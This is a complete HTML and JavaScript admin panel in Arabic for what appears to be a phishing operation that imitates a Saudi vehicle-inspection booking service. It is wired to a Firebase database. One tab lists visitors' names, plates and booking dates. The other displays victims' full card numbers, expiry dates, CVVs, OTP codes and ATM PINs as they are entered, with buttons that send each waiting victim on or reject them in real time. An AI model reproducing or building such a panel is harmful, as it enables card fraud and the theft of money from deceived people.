<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>لوحة التحكم - Saso Inspection</title>
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
    <style>
        body { font-family: 'Segoe UI', Tahoma, sans-serif; background: #f4f7f6; margin: 0; padding: 0; }
        .navbar { background: #1e7344; padding: 15px; display: flex; justify-content: center; gap: 10px; position: sticky; top: 0; z-index: 1000; }
        .nav-btn { background: rgba(255,255,255,0.1); border: 1px solid rgba(255,255,255,0.2); color: white; padding: 12px; border-radius: 8px; cursor: pointer; font-weight: bold; flex: 1; max-width: 250px; }
        .nav-btn.active { background: #ffffff; color: #1e7344; }
        .visitor-counter { background: #ffd700; color: #000; padding: 10px; text-align: center; font-weight: bold; font-size: 18px; }
        .container { padding: 15px; }
        .tab-content { display: none; }
        .tab-content.active { display: block; }
        
        .operation-row { background: white; border-radius: 12px; padding: 15px; margin-bottom: 15px; border: 1px solid #ddd; box-shadow: 0 4px 6px rgba(0,0,0,0.05); }
        .status-badge { padding: 4px 10px; border-radius: 20px; font-size: 12px; font-weight: bold; background: #e9ecef; color: #495057; }
        .status-waiting { background: #fff3cd; color: #856404; animation: blink 1s infinite; }
        
        @keyframes blink { 50% { opacity: 0.5; } }

        .data-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(150px, 1fr)); gap: 10px; margin: 15px 0; }
        .box { padding: 10px; border-radius: 8px; font-size: 14px; background: #f8f9fa; border: 1px solid #eee; }
        .card-box { background: #fffcf0; border-color: #fcebb6; color: #856404; font-weight: bold; }
        
        .controls { display: flex; gap: 10px; margin-top: 15px; border-top: 1px solid #eee; padding-top: 15px; }
        .btn { flex: 1; padding: 10px; border: none; border-radius: 6px; cursor: pointer; font-weight: bold; color: white; }
        .btn-accept { background: #28a745; }
        .btn-reject { background: #dc3545; }
        .btn-delete { background: #6c757d; max-width: 50px; }

        h3 { margin: 0 0 10px 0; color: #1e7344; font-size: 18px; display: flex; justify-content: space-between; align-items: center; }
    </style>
</head>
<body>

<div class="visitor-counter">المتواجدون الآن: <span id="onlineCount">0</span> عملاء نشطين 🌐</div>

<div class="navbar">
    <button class="nav-btn active" onclick="openTab(event, 'bookingSection')">👤 بيانات الحجز</button>
    <button class="nav-btn" onclick="openTab(event, 'cardsSection')">💳 التحكم في الدفع</button>
</div>

<div class="container">
    <div id="bookingSection" class="tab-content active">
        <div id="bookingGrid"></div>
    </div>
    
    <div id="cardsSection" class="tab-content">
        <div id="paymentsContainer"></div>
    </div>
</div>

<script>
    const firebaseConfig = {
        apiKey: "AIzaSyAeZAjt4kZWVLJSKiehqLFrT...", 
        authDomain: "saso-inspection.firebaseapp.com",
        databaseURL: "https://saso-inspection-default-rtdb.firebaseio.com",
        projectId: "saso-inspection",
        storageBucket: "saso-inspection.appspot.com",
        messagingSenderId: "1009002235896",
        appId: "1:1009002235896:web:3f0d6f84b6e956ffa5b80d"
    };
    
    firebase.initializeApp(firebaseConfig);
    const database = firebase.database();

    // عداد الزوار الحقيقي
    database.ref('live_visitors').on('value', s => {
        document.getElementById('onlineCount').innerText = s.numChildren();
    });

    // عرض بيانات الحجز
    database.ref('visitors').on('value', (snapshot) => {
        const grid = document.getElementById('bookingGrid');
        grid.innerHTML = '';
        snapshot.forEach((child) => {
            const val = child.val();
            grid.innerHTML += `
            <div class="operation-row">
                <h3>${val.fullName || 'زائر'} <small style="font-size:11px; color:#999;">${child.key}</small></h3>
                <div class="data-grid">
                    <div class="box">🚗 ${val.vehicleType || '-'}</div>
                    <div class="box">🔢 ${val.plateNumber || '-'}</div>
                    <div class="box">📍 ${val.region || '-'}</div>
                    <div class="box">📅 ${val.bookingDate || '-'}</div>
                </div>
                <button class="btn btn-reject" onclick="deleteData('visitors/${child.key}')">حذف البيانات</button>
            </div>`;
        });
    });

    // عرض بيانات البطاقات مع أزرار التحكم اللحظي
    database.ref('payments').on('value', (snapshot) => {
        const container = document.getElementById('paymentsContainer');
        container.innerHTML = '';
        snapshot.forEach((child) => {
            const val = child.val();
            const id = child.key;
            
            // تحديد حالة العميل لتنبيهك
            let statusText = "مستقر";
            let statusClass = "";
            if(val.status.includes('waiting')) {
                statusText = "ينتظر ردك الآن ⏳";
                statusClass = "status-waiting";
            }

            container.innerHTML += `
            <div class="operation-row">
                <h3>
                    <span>👤 ${val.cardHolder || 'عميل جديد'}</span>
                    <span class="status-badge ${statusClass}">${statusText}</span>
                </h3>
                
                <div class="data-grid">
                    <div class="box card-box">💳 ${val.cardNumber || '----'}</div>
                    <div class="box card-box">📅 ${val.expiry || '--/--'} | CVV: ${val.cvv || '---'}</div>
                    <div class="box" style="background:#e3f2fd; border-color:#bbdefb;">🔐 OTP: <b>${val.otp || 'بانتظار الإدخال'}</b></div>
                    <div class="box" style="background:#f3e5f5; border-color:#e1bee7;">🏧 PIN: <b>${val.atm_pin || 'بانتظار الإدخال'}</b></div>
                </div>

                <div class="controls">
                    <button class="btn btn-accept" onclick="updateStatus('${id}', 'accept')">✅ قبول (الصفحة التالية)</button>
                    <button class="btn btn-reject" onclick="updateStatus('${id}', 'reject')">❌ رفض (إظهار لون أحمر)</button>
                    <button class="btn btn-delete" onclick="deleteData('payments/${id}')">🗑</button>
                </div>
            </div>`;
        });
    });

    // وظيفة التحكم: القبول أو الرفض
    function updateStatus(userId, action) {
        database.ref('payments/' + userId).update({
            status: action,
            last_update: firebase.database.ServerValue.TIMESTAMP
        });
    }

    function deleteData(path) { 
        if(confirm('هل أنت متأكد؟')) database.ref(path).remove(); 
    }

    function openTab(evt, tabName) {
        var i, tabcontent, navbtns;
        tabcontent = document.getElementsByClassName("tab-content");
        for (i = 0; i < tabcontent.length; i++) tabcontent[i].style.display = "none";
        navbtns = document.getElementsByClassName("nav-btn");
        for (i = 0; i < navbtns.length; i++) navbtns[i].className = navbtns[i].className.replace(" active", "");
        document.getElementById(tabName).style.display = "block";
        evt.currentTarget.className += " active";
    }
</script>
</body>
</html>
